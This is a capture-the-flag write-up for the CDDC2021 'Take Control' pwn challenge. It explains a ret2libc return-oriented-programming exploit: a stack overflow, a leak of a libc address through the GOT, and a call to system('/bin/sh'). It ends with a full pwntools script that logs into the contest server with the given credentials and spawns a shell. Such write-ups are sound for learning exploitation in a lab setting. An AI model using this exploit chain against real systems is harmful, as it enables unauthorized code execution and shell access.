---
title : "Take Control [Pwn]"
categories: CDDC2021
disass:
 - url: /assets/images/take_control/main.png
   image_path: /assets/images/take_control/main.png
   title: "main"
 - url: /assets/images/take_control/vuln.png
   image_path: /assets/images/take_control/vuln.png
   title: "vuln"
---

Simple Return Oriented Programming challenge. Second pwn challenge in CDDC2021.

# Challenge Description

One of TheKeepers found a file that seems too vulnerable we need your help to exploit it. Download the file and try to figure out how you can exploit it. Once you have a working exploit, execute it on the remote target.

```
Target: 18.136.182.104 port 60220
Username: bot
Password: GDCpa$$w0rd2021
```

Link: [http://157.230.245.61/0x0602/Ehai8f/m2/file.zip](http://157.230.245.61/0x0602/Ehai8f/m2/file.zip)

SHA256: 9ea8ac313a943e84e0dd2126e825232c32d7036ae43f463e1aee83dd296fac16

# Solution

Download + unzip the zip file, we get a 32bit binary and libc. This strongly hints ROP. Since it is 32 bit, no gadgets are needed, and arguments just go onto the stack.

Before I did anything, I ran a quick `checksec` on both the files.

{% include image.html url="/assets/images/take_control/checksec.png" description="" %}

Binary doesn't have PIE, great! I later found out that server has ASLR, so that means I have to leak libc base somehow...

Next thing I did was just normal protocol: fire up Ghidra.

{% include gallery id="disass" %}

So we can see that `main` elevates our privileges, then calls `vuln`, which is vulnerable (*duhhh*) to buffer overflow. The required padding is 404 bytes for the array and 8 bytes for array pointer and base pointer.

First plan is to call `system("/bin/sh")`, which will give us root shell.

For this, we need to find `system` and `"/bin/sh"` in libc, we can fire up gdb and verify that these two are present. It's not in the binary itself, trust me, I've looked :) 

One thing to note is that we need to make sure we run the binary with the libc in the current directory. So, run this:

```bash
export LD_LIBRARY_PATH=$(pwd)
```

Since `system` is not imported, we would need to leak libc base, then using the offset we have, to find the address of `system` during runtime. We can make use of the handy `geteuid` function that gets called in `main` which means its `.plt.got` entry would have already been updated, saving us one less call (which is totally insignificant but hey).

Here's the ROP chain for leaking `geteuid` address.

```python
rop.raw(OFFSET)
rop.raw(puts)
rop.raw(vuln)
rop.raw(geteuid_got)
```

What this does is print the contents in `geteuid_got`, which is the address of the GOT entry storing the address of the dynamically linked function. Then it returns back to `vuln` after leaking the address, for us to construct a second ROP chain.

With the address of `geteuid` we can calculate the libc base by subtracting away its offset. Then, we can calculate the addresses of `system` and `"/bin/sh"` trivially.

```python
addr_line = r.recvline() # Leaked address
geteuid_addr = int.from_bytes(addr_line[0:4], 'little')

lib_base = geteuid_addr - lib_geteuid
log.info("LIBC base: %s" % hex(lib_base))

system = lib_base + lib_system

str_offset = next(libc.search(b"/bin/sh"))

sh_str = lib_base + str_offset
```

Finally, we spawn shell:

```python
rop.raw(OFFSET)
rop.raw(system)
rop.raw(vuln) # filler
rop.raw(sh_str)
```

```bash
$ cat flag.txt
CDDC21{Y0u_OverFlow_1T}
```

# Final Script
```python
#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./gdc_library")
rop = ROP(elf)

if len(sys.argv) < 2 or sys.argv[1] != "remote":
    libc = ELF("./libc.so.6")
    r = process("./gdc_library")
    pause()
else:
    libc = ELF("./amd_libc.so.6")
    ssh_client = ssh(user="bot", password="GDCpa$$w0rd2021", host="18.136.182.104", port=60220)
    r = ssh_client.process("./gdc_library")


OFFSET = "A" * 404 + "B" * 8


###########################
### Important addresses ###
###########################

geteuid = elf.sym["geteuid"]
puts    = elf.sym["puts"]
vuln    = elf.sym["vuln"]

geteuid_got = elf.got["geteuid"]

lib_geteuid = libc.sym["geteuid"]
lib_system  = libc.sym["system"]


##############################
### Leak `geteuid` address ###
##############################

rop.raw(OFFSET)
rop.raw(puts)
rop.raw(vuln)
rop.raw(geteuid_got)

r.recvuntil(":")
r.send(rop.chain())


###################################
### Calculate LIBC base address ###
###################################

r.recvline() # Junk line
addr_line = r.recvline() # Leaked address
geteuid_addr = int.from_bytes(addr_line[0:4], 'little')

lib_base = geteuid_addr - lib_geteuid
log.info("LIBC base: %s" % hex(lib_base))


####################################
### Calculate required addresses ###
####################################

system = lib_base + lib_system

str_offset = next(libc.search(b"/bin/sh"))

sh_str = lib_base + str_offset


###################
### Spawn shell ###
###################

rop = ROP(elf) # new chain

rop.raw(OFFSET)
rop.raw(system)
rop.raw(vuln) # filler
rop.raw(sh_str)

r.recvuntil(":")
r.send(rop.chain())

r.interactive()
```

Flag: `CDDC21{Y0u_OverFlow_1T}`
